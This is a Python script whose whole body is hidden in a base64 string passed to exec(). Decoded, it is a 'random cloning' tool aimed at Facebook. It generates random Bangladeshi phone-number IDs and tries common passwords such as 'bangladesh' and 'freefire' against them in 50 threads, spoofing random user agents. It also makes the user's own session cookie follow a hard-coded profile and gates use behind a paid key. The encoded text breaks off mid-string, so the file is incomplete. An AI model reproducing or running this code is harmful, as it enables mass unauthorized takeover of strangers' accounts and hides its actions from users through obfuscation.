import base64
exec(base64.b64decode("I2NvZGRpbmcgYnkgU0g0V09OIEFITUVE4p2k77iP4pyoDQojRkIgTElOazogaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2N5YmVyLmdhbWVyLlNINFdPTi4wDQojRlVDSyBZT1VSIEJZUEFTUyBTWVNURU0g8J+YpA0KDQppbXBvcnQgb3Msc3lzLHRpbWUsanNvbixyYW5kb20scmUsc3RyaW5nLHBsYXRmb3JtLGJhc2U2NCx1dWlkDQoNCm9zLnN5c3RlbSgiZ2l0IHB1bGwiKQ0KDQpmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cCBhcyBzb3ANCg0KZnJvbSBiczQgaW1wb3J0IEJlYXV0aWZ1bFNvdXANCg0KaW1wb3J0IHJlcXVlc3RzIGFzIHJlc3MNCg0KZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZQ0KDQpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQ0KDQpmcm9tIHRpbWUgaW1wb3J0IHNsZWVwDQoNCmZyb20gdGltZSBpbXBvcnQgc2xlZXAgYXMgd2FrdHUNCg0KdHJ5Og0KDQogICAgaW1wb3J0IHJlcXVlc3RzDQoNCiAgICBmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yIGFzIFRocmVhZFBvb2wNCg0KICAgIGltcG9ydCBtZWNoYW5pemUNCg0KICAgIGZyb20gcmVxdWVzdHMuZXhjZXB0aW9ucyBpbXBvcnQgQ29ubmVjdGlvbkVycm9yDQoNCmV4Y2VwdCBNb2R1bGVOb3RGb3VuZEVycm9yOg0KDQogICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBtZWNoYW5pemUgcmVxdWVzdHMgZnV0dXJlcyBiczQ9PTIgPiAvZGV2L251bGwnKQ0KDQogICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBiczQnKQ0KDQpkZWYga2hsZCgpOg0KDQogICAgb3Muc3lzdGVtKCdjbGVhcicpDQoNCiAgICBqYWxhbihsb2dvKSAgICANCiAgICANCiAgICBwcmludCgnXDAzM1sxOzkybRoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGicpDQoNCiAgICBqYWxhbignXDAzM1sxOzkxbVtcMDMzWzE7OTJtMVwwMzNbMTs5MW1dXDAzM1sxOzkybSBSQU5ET00gQ1JBQ0sgJykNCg0KICAgIGphbGFuKCdcMDMzWzE7OTFtW1wwMzNbMTs5Mm0yXDAzM1sxOzkxbV1cMDMzWzE7OTJtIENPTlRBQ1QgTUUgRkFDRUJPT0snKQ0KDQogICAgamFsYW4oJ1wwMzNbMTs5MW1bXDAzM1sxOzkybTNcMDMzWzE7OTFtXVwwMzNbMTs5Mm0gRk9MTE9XIEdJVEhVQiBBQ0NPVU5UJykNCg0KICAgIGphbGFuKCdcMDMzWzE7OTFtW1wwMzNbMTs5Mm00XDAzM1sxOzkxbV1cMDMzWzE7OTJtIEZPTExPVyBQQUdFJykNCg0KICAgIGphbGFuKCdcMDMzWzE7OTFtW1wwMzNbMTs5Mm0wXDAzM1sxOzkxbV1cMDMzWzE7OTFtIEVYSVQnKQ0KDQogICAgb3B0ID0gaW5wdXQoJ1xuXHgxYlsxOzMybVwwMzNbMTs5MW1bXDAzM1sxOzkxbeKAol1cMDMzWzE7MzJtIENIT09TRSA6ICcpDQoNCiAgICBpZiBvcHQgPT0gJzEnOg0KDQogICAgICAgIGkoKQ0KDQogICAgaWYgTm9uZSA9PSAnMic6DQoNCiAgICAgICAgb3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vY3liZXIuZ2FtZXIuU0g0V09OLjAnKQ0KDQogICAgICAgIHJldHVybiBOb25lDQoNCiAgICBpZiBOb25lID09ICczJzoNCg0KICAgICAgICBvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vZ2l0aHViLmNvbS9HNE1FUi1TSDRXT04tNDA0JykNCg0KICAgICAgICByZXR1cm4gTm9uZQ0KDQogICAgaWYgTm9uZSA9PSAnNCc6DQoNCiAgICAgICAgb3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3lvdXR1YmUuY29tL0BzaGF3b250ZWNoYmQ1MTI5JykNCg0KICAgIGlmIE5vbmUgPT0gJzAnOg0KDQogICAgICAgIG9zLnN5c3RlbSgnZXhpdCcpDQoNCiAgICAgICAgcmV0dXJuIE5vbmUNCg0KICAgIA0KDQpkZWYgY2VrX2FwayhzZXNzaW9uLGNva2kpOg0KDQogICAgdz1zZXNzaW9uLmdldCgiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL3NldHRpbmdzL2FwcHMvdGFiYmVkLz90YWI9YWN0aXZlIixjb29raWVzPXsiY29va2llIjpjb2tpfSkudGV4dA0KDQogICAgc29wID0gQmVhdXRpZnVsU291cCh3LCJodG1sLnBhcnNlciIpDQoNCiAgICB4ID0gc29wLmZpbmQoImZvcm0iLG1ldGhvZD0icG9zdCIpDQoNCiAgICBnYW1lID0gW2kudGV4dCBmb3IgaSBpbiB4LmZpbmRfYWxsKCJoMyIpXQ0KDQogICAgaWYgbGVuKGdhbWUpPT0wOg0KDQogICAgICAgIHByaW50KGYnXHIlc1slcyElc10gJXNTT1JSWSBUSEVSRSBJUyBOTyBBQ1RJVkUgIEFQSyVzICAnJShOLE0sTixNLE4pKQ0KDQogICAgZWxzZToNCg0KICAgICAgICBwcmludChmJ1xyW8OwxbjFvcKuXSAlcyBceDFiWzE7OTVtIFlPVVIgQUNUSVZFIEFQUFMgICA6e1dISVRFfSclKEdSRUVOKSkNCg0KICAgICAgICBmb3IgaSBpbiByYW5nZShsZW4oZ2FtZSkpOg0KDQogICAgICAgICAgICBwcmludChmIlxyWyVzJXNdICVzJXMiJShOLGkrMSxnYW1lW2ldLnJlcGxhY2UoIkRpdGFtYmFoa2FuIHBhZGEiLCIgRGl0YW1iYWhrYW4gcGFkYSIpLE4pKQ0KDQogICAgICAgICNlbHNlOg0KDQogICAgICAgICAgICAjcHJpbnQoZidcciAlc1slcyElc10gU29ycnksIEFwayBjaGVjayBmYWlsZWQgaW52YWxpZCBjb29raWUnJShOLE0sTikpDQoNCiAgICB3PXNlc3Npb24uZ2V0KCJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vc2V0dGluZ3MvYXBwcy90YWJiZWQvP3RhYj1pbmFjdGl2ZSIsY29va2llcz17ImNvb2tpZSI6Y29raX0pLnRleHQNCg0KICAgIHNvcCA9IEJlYXV0aWZ1bFNvdXAodywiaHRtbC5wYXJzZXIiKQ0KDQogICAgeCA9IHNvcC5maW5kKCJmb3JtIixtZXRob2Q9InBvc3QiKQ0KDQogICAgZ2FtZSA9IFtpLnRleHQgZm9yIGkgaW4geC5maW5kX2FsbCgiaDMiKV0NCg0KICAgIGlmIGxlbihnYW1lKT09MDoNCg0KICAgICAgICBwcmludChmJ1xyJXNbJXMhJXNdICVzU09SUlkgVEhFUkUgSVMgTk8gRVhQSVJFRCBBUEslcyAgICAgICAgICAgXG4nJShOLE0sTixNLE4pKQ0KDQogICAgZWxzZToNCg0KICAgICAgICBwcmludChmJ1xyW8OwxbjFvcKuXSAlcyBceDFiWzE7OTVtIFlPVVIgRVhQSVJFRCBBUFBTICAgIDp7V0hJVEV9JyUoTSkpDQoNCiAgICAgICAgZm9yIGkgaW4gcmFuZ2UobGVuKGdhbWUpKToNCg0KICAgICAgICAgICAgcHJpbnQoZiJcclslcyVzXSAlcyVzIiUoTixpKzEsZ2FtZVtpXS5yZXBsYWNlKCJLZWRhbHV3YXJzYSIsIiBLZWRhbHV3YXJzYSIpLE4pKQ0KDQogICAgICAgIGVsc2U6DQoNCiAgICAgICAgICAgIHByaW50KCcnKQ0KDQoNCg0KZGVmIGZvbGxvdyhzZWxmLCBzZXNzaW9uLCBjb2tpKToNCg0KICAgICAgICByID0gQmVhdXRpZnVsU291cChzZXNzaW9uLmdldCgnaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxNTMxNTI1ODUxOScsIHsNCg0KICAgICAgICAgICAgJ2Nvb2tpZSc6IGNva2kgfSwgKiooJ2Nvb2tpZXMnLCkpLnRleHQsICdodG1sLnBhcnNlcicpDQoNCiAgICAgICAgZ2V0ID0gci5maW5kKCdhJywgJ0lrdXRpJywgKiooJ3N0cmluZycsKSkuZ2V0KCdocmVmJykNCg0KICAgICAgICBzZXNzaW9uLmdldCgnaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tJyArIHN0cihnZXQpLCB7DQogICAgICAgIA0KICAgICAgICAgICAgJ2Nvb2tpZSc6IGNva2kgfSwgKiooJ2Nvb2tpZXMnLCkpLnRleHQNCg0KICAgICAgICAgICAgDQogICAgICAgICAgIA0KDQpjbGFzcyBqYWxhbjoNCg0KICAgIGRlZiBfX2luaXRfXyhzZWxmLCB6KToNCg0KICAgICAgICBmb3IgZSBpbiB6ICsgIlxuIjoNCg0KICAgICAgICAgICAgc3lzLnN0ZG91dC53cml0ZShlKQ0KDQogICAgICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkNCg0KICAgICAgICAgICAgdGltZS5zbGVlcCgwLjAwMSkNCg0KICAgICAgICAgICAgDQoNClJFRCA9ICdcMDMzWzE7OTFtJw0KDQpXSElURSA9ICdcMDMzWzE7OTdtJw0KDQpHUkVFTiA9ICdcMDMzWzE7MzJtJyAjDQoNCllFTExPVyA9ICdcMDMzWzE7MzNtJw0KDQpCTFVFID0gJ1wwMzNbMTszNG0nDQoNCk9SQU5HRSA9ICdcMDMzWzE7MzVtJw0KDQpQID0gJ1x4MWJbMTs5N20nICMgUFVUSUgNCg0KTSA9ICdceDFiWzE7OTFtJyAjIE1FUkFIDQoNCkggPSAnXHgxYlsxOzkybScgIyBISUpBVQ0KDQpLID0gJ1x4MWJbMTs5Mm0nICMgS1VOSU5HDQoNCkIgPSAnXHgxYlsxOzk0bScgIyBCSVJVDQoNClUgPSAnXHgxYlsxOzk1bScgIyBVTkdVDQoNCk8gPSAnXHgxYlsxOzk2bScgIyBCSVJVIE1VREENCg0KTiA9ICdceDFiWzBtJyAgICAjIFdBUk5BIE1BVEkNCg0KQSA9ICdceDFiWzE7OTBtJyAjIFdBUk5BIEFCVSBBQlUNCg0KQk4gPSAnXHgxYlsxOzEwN20nICMgQkVMQUtBTkcgUFVUSUgNCg0KQkJMID0gJ1x4MWJbMTsxMDZtJyAjIEJFTEFLQU5HIEJJUlUgTEFOR0lUDQoNCkJQID0gJ1x4MWJbMTsxMDVtJyAjIEJFTEFLQU5HIFBJTksNCg0KQkIgPSAnXHgxYlsxOzEwNG0nICMgQkVMQUtBTkcgQklSVQ0KDQpCSyA9ICdceDFiWzE7MTAzbScgIyBCRUxBS0FORyBLVU5JTkcNCg0KQkggPSAnXHgxYlsxOzEwMm0nICMgQkVMQUtBTkcgSElKQVUNCg0KQk0gPSAnXHgxYlsxOzEwMW0nICMgQkVMQUpBTkcgTUVSQUgNCg0KQkEgPSAnXHgxYlsxOzEwMG0nICMgQkVMQUtBTkcgQUJVIEFCVQ0KDQpBID0gJ1x4MWJbMTs5N20nIA0KDQpCID0gJ1x4MWJbMTs5Nm0nIA0KDQpDID0gJ1x4MWJbMTs5MW0nIA0KDQpEID0gJ1x4MWJbMTs5Mm0nDQoNCk0gPSAnXDAzM1sxOzMxbScNCg0KSCA9ICdcMDMzWzE7MzJtJw0KDQpOID0gJ1x4MWJbMTszN20nICAgIA0KDQpFID0gJ1x4MWJbMTs5M20nIA0KDQpGID0gJ1x4MWJbMTs5NG0nDQoNCkcgPSAnXHgxYlsxOzk1bScNCg0KUCA9ICdcMDMzWzE7MzdtJw0KDQpSRUQgPSAnXDAzM1sxOzkxbScNCg0KV0hJVEUgPSAnXDAzM1sxOzk3bScNCg0KR1JFRU4gPSAnXDAzM1sxOzMybScgIw0KDQpZRUxMT1cgPSAnXDAzM1sxOzMzbScNCg0KQkxVRSA9ICdcMDMzWzE7MzRtJw0KDQpPUkFOR0UgPSAnXDAzM1sxOzM1bScNCg0Kbm93ID0gZGF0ZXRpbWUubm93KCkNCg0KZHRfc3RyaW5nID0gbm93LnN0cmZ0aW1lKCIlSDolTSIpDQoNCmN1cnJlbnQgPSBkYXRldGltZS5ub3coKQ0KDQp0YSA9IGN1cnJlbnQueWVhcg0KDQpidSA9IGN1cnJlbnQubW9udGgNCg0KaGEgPSBjdXJyZW50LmRheQ0KDQp0b2RheSA9IGRhdGUudG9kYXkoKQ0KDQpteV9jb2xvciA9IFsNCg0KIFAsIE0sIEgsIEssIEIsIFUsIE8sIE5dDQoNCndhcm5hID0gcmFuZG9tLmNob2ljZShteV9jb2xvcikNCg0Kbm93ID0gZGF0ZXRpbWUubm93KCkNCg0KZHRfc3RyaW5nID0gbm93LnN0cmZ0aW1lKCIlSDolTSIpDQoNCmN1cnJlbnQgPSBkYXRldGltZS5ub3coKQ0KbWFoZGk9J2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9HNE1FUi1TSDRXT04tNDA0L1JBTkRPTS1URVNUL21haW4vQXBwcm92YWwudHh0Jw0KdGEgPSBjdXJyZW50LnllYXINCg0KYnUgPSBjdXJyZW50Lm1vbnRoDQoNCmhhID0gY3VycmVudC5kYXkNCg0KdG9kYXkgPSBkYXRlLnRvZGF5KCkNCg0KbG9nbyA9ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKCIiIiAgIA0KDQpcMzNbMTs5Mm1kOGIgICBkYiAgLmQ4OGIuICBkODg4OGIuIGQ4ODg4ODhiIGQ4ODg4ODhiICAuZDhiLiAgDQpcMzNbMTs5Mm04ODhvICA4OCAuOFAgIFk4LiA4OCAgYDhEICAgYDg4JyAgIGB+fjg4fn4nIGQ4JyBgOGIgDQpcMzNbMTs5Mm04OFY4byA4OCA4OCAgICA4OCA4OG9vb1knICAgIDg4ICAgICAgIDg4ICAgIDg4b29vODggDQpcMzNbMTs5Mm04OCBWOG84OCA4OCAgICA4OCA4OH5+fmIuICAgIDg4ICAgICAgIDg4ICAgIDg4fn5+ODggDQpcMzNbMTs5Mm04OCAgVjg4OCBgOGIgIGQ4JyA4OCAgIDhEICAgLjg4LiAgICAgIDg4ICAgIDg4ICAgODggDQpcMzNbMTs5Mm1WUCAgIFY4UCAgYFk4OFAnICBZODg4OFAnIFk4ODg4ODhQICAgIFlQICAgIFlQICAgWVAgDQoNClwzM1sxOzkybeKVlOKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKVlyAgICAgICAgICAgICAgIA0K4pWRICBceDFiWzk3bVwwMzNbMzc7NDFtICBGUkVFIEJBTkdMQURFU0hJIFJBTkRPTSBDTE9OSU5HIFYzMCBcMDMzWzA7bSAgICDilZENClwzM1sxOzkybeKVmuKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKVnSAgICAgICAgICAgIA0KXDMzWzE7OTJt4pWU4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pWXDQpcMzNbMTs5Mm3ilZFbfl0gXDAzM1sxOzkxbSBERVZPTFBFUiAgIDogICAgICAgICAgTVIgTk9CSVRBICAgICAgICBcMzNbMTs5Mm3ilZEgICAgICAgICAgICAgICANClwzM1sxOzkybeKVkVt+XSAgRkFDRUJPT0sgICA6ICAgICAgICAgIFNBSEFEQVQgSE9TU0FJTiAgXDMzWzE7OTJt4pWRICAgICAgICAgICAgICAgICANClwzM1sxOzkybeKVkVt+XSBcMDMzWzE7OTNtIE5FVFdPUksgICAgOiAgICAgICAgICAzRy80Ry81RyAvRmlyZfCfp6hcMzNbMTs5Mm0g4pWRDQpcMzNbMTs5Mm3ilZFbfl0gXDAzM1sxOzM0bSBHSVRIVUIgICAgIDogICAgICAgICAgRzRNRVItU0g0V09OLTQwNFwzM1sxOzkybSDilZEgICAgICAgICAgDQpcMzNbMTs5Mm3ilZFbfl0gXDAzM1sxOzM1bSBUT09MUyAgICAgIDogICAgICAgICAgQkQgUkFORE9NIEZJUkUgIFwzM1sxOzkybSDilZEgICAgICAgICAgICAgICAgIA0KXDMzWzE7OTJt4pWa4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pWdDQoiIiIpDQoNCmxvb3AgPSAwDQoNCm9rcyA9IFtdDQoNCmNwcyA9IFtdDQoNCg0KDQpkZWYgY2xlYXIoKToNCg0KICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KDQogICAgcHJpbnQobG9nbykNCg0KZnJvbSB0aW1lIGltcG9ydCBsb2NhbHRpbWUgYXMgbHQNCg0KZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIGNtZA0KDQpsdHggPSBpbnQobHQoKVszXSkNCg0KaWYgbHR4ID4gMTI6DQoNCiAgICBhID0gbHR4LTEyDQoNCiAgICB0YWcgPSAiUE0iDQoNCmVsc2U6DQoNCiAgICBhID0gbHR4DQoNCiAgICB0YWcgPSAiQU0iDQoNCiAgICANCg0KICAgIA0KZGVmIHBwKCk6DQogICAgICAgIHByaW50IChsb2dvKQ0KDQogICAgICAgIHByaW50ICgnICAgICAgICAgRlVDSyBZT1VSIEJZUEFTUyBTWVNURU0g8J+TjCAnKQ0KICAgICAgICANCiAgICAgICAgcHJpbnQoJycpDQoNCiAgICAgICAgcHJpbnQgKCdceDFiWzE7OTJtICAgICAgICBZb3UgRG9udCBIYXZlIFN1YnNjcnB0aW9uJykNCiAgICAgICAgDQogICAgICAgIHByaW50KCcnKQ0KDQogICAgICAgIHByaW50ICgnICAgICAgICAgIFRoaXMgaXMgTVIgTk9CSVRBIFRvb2xzIFNvIE5lZWQgdG8gQXBwcm92YWwnKQ0KICAgICAgICANCiAgICAgICAgcHJpbnQoJycpDQoNCiAgICAgICAgcHJpbnQgKCdcMDMzWzE7OTJtICAgICAgICAgSWYgeW91IHdhbnQgdG8gYnV5IHByZXNoIGVudGVyJykNCg0KICAgICAgICBwcmludCAoJycpDQoNCiAgICAgICAgbXlpZCA9IHV1aWQudXVpZDQoKS5oZXhbOjEwXQ0KDQogICAgICAgIHByaW50ICgnICAgICAgICAgWU9VUiBLRVkgOlwwMzNbMTs5M20gJyArIG15aWQgKyBpbXQpDQoNCiAgICAgICAga29rID0gb3BlbignL3NkY2FyZC8ubWFoZGkudHh0JywgJ3cnKQ0KDQogICAgICAgIGtvay53cml0ZShteWlkICsgaW10KQ0KDQogICAgICAgIGtvay5jbG9zZSgpDQoNCiAgICAgICAgcHJpbnQgKCcnKQ0KDQogICAgICAgIGlucHV0KCcgICBceDFiWzA7MzRtRU5URVIgVE8gQlVZIFRPT0xTICcpDQoNCiAgICAgICAgb3Muc3lzdGVtKCdhbSBzdGFydCBodHRwczovL3dhLm1lLys4ODAxOTQxMDEwMTg5P3RleHQ9QXNzYWxhbW93YWxpa29tJTIwU2lyLCUyMEklMjBXYW50JTIwVG8lMjBCdXklMjBZb3VyJTIwTk9CSVRBJTIwUGFpZCUyMFRvb2xzLiUyME15JTIwS2V5OiUyMCcra2V5MSkNCg0KICAgICAgICBtZXgoKQ0KdHJ5Og0KDQogICAgcHJpbnQoJ1xuXG5cMDMzWzE7MzNtTE9BRElORyBBU1NFVCBGSUxFUyAuLi4gXDAzM1swOzk3bScpDQoNCiAgICB2ID0gNS4yDQoNCiAgICB1cGRhdGUgPSAoJzUuMicpDQoNCiAgICB1cGRhdGUgPSAoJzUuMicpDQoNCiAgICBpZiBzdHIodikgaW4gdXBkYXRlOg0KDQogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KDQogICAgZWxzZTpwYXNzDQoNCmV4Y2VwdDpwcmludCgnXG5cMDMzWzE7MzFtTk8gSU5URVJORVQgQ09OTkVDVElPTiAuLi4gXDAzM1swOzk3bScpDQoNCiNnbG9iYWwgZnVuY3Rpb25zDQppbXQgPSAnPVVTRVI9Jw0KZGVmIGR5bmFtaWModGV4dCk6DQoNCiAgICB0aXRpayA9IFsnLiAgICcsJy4uICAnLCcuLi4gJywnLi4uLiAnXQ0KDQogICAgZm9yIG8gaW4gdGl0aWs6DQoNCiAgICAgICAgcHJpbnQoJ1xyJyt0ZXh0K28pLA0KDQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKTt0aW1lLnNsZWVwKDEpDQoNCg0KDQojVXNlciBhZ2VudHMNCg0KdWdlbjI9W10NCg0KdWdlbj1bXQ0KDQogDQoNCmZvciB4ZCBpbiByYW5nZSgxMDAwMCk6DQoNCiAgICBhYT0nTW96aWxsYS81LjAgKExpbnV4OyBVOyBBbmRyb2lkJw0KDQogICAgYj1yYW5kb20uY2hvaWNlKFsnMycsJzQnLCc1JywnNicsJzcnLCc4JywnOScsJzEwJywnMTEnLCcxMicsJzEzJywnMTQnLCcxNScsJzE2JywnMTcnXSkNCg0KICAgIGM9JyBlbi11czsgR1QtJw0KDQogICAgZD1yYW5kb20uY2hvaWNlKFsnQScsJ0InLCAnQycsICdEJywgJ0UnLCAnRicsICdHJywgJ0gnLCAnSScs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J1wwMzNbMTs5MW1bXDAzM1sxOzkybX5cMDMzWzE7OTFtXVwwMzNbMTs5Mm0gVVNFUlwnUyBOQU1FIDogXDAzM1sxOzkybScrYmFsKQ0KDQogICAgICAgIHByaW50KCdcMDMzWzE7OTFtW1wwMzNbMTs5Mm1+XDAzM1sxOzkxbV1cMDMzWzE7OTJtIENPVU5UUlkgQ09ERSA6IFwwMzNbMTs5MG0nK2NvZGUpDQoNCiAgICAgICAgcHJpbnQoJ1wwMzNbMTs5MW1bXDAzM1sxOzkybX5cMDMzWzE7OTFtXVwwMzNbMTs5Mm0gVE9UQUwgSURTIDogXDAzM1sxOzkybScrdGwpDQoNCiAgICAgICAgcHJpbnQoJ1wwMzNbMTs5MW1bXDAzM1sxOzkybX5cMDMzWzE7OTFtXVwwMzNbMTs5Mm0gQ1JBQ0tJTkcgSEFTIFNUQVJURUQnKQ0KDQogICAgICAgIHByaW50KCdcMDMzWzE7OTFtW1wwMzNbMTs5Mm1+XDAzM1sxOzkxbV1cMDMzWzE7OTJtIFdPUktTIE9OIERBVEEgQU5EIFdJRkknKQ0KICAgICAgICANCiAgICAgICAgcHJpbnQoJ1wwMzNbMTs5MW1bXDAzM1sxOzkybX5cMDMzWzE7OTFtXVwwMzNbMTs5Mm0gTVIgTk9CSVRBIFRPT0xTIFVQREFURSBEb25l4pyoJykNCg0KICAgICAgICBqYWxhbignXDMzWzE7OTJt4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBJykNCg0KICAgICAgICBmb3IgbG92ZSBpbiB1c2VyOg0KDQogICAgICAgICAgICBwd3ggPSBbbG92ZSwnYmFuZ2xhZGVzaCcsJ0JhbmdsYWRlc2gnLCdmcmVlIGZpcmUnLCdmcmVlZmlyZSddDQoNCiAgICAgICAgICAgIHVpZCA9IGNvZGUrbG92ZQ0KDQogICAgICAgICAgICBtYW5zaGVyYS5zdWJtaXQocmNyYWNrLHVpZCxwd3gsdGwpDQoNCiAgICBwcmludCgnQ1JBQ0sgUFJPQ0VTUyBIQVMgQkVFTiBDT01QTEVURUQgJykNCg0KICAgIHByaW50KCdJRFMgU0FWRUQgSU4gTk9CSVRBLU9LLnR4dCwgTk9CSVRBLUNQLnR4dCcpDQoNCmRlZiBtZXgoKToNCg0KICAgIGltdCA9ICc9VVNFUj0nDQoNCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCg0KICAgIHByaW50IChsb2dvKQ0KDQogICAgDQoNCiAgICB0cnk6DQoNCiAgICAgICAga2V5MSA9IG9wZW4oJy9zZGNhcmQvLm1haGRpLnR4dCcsICdyJyk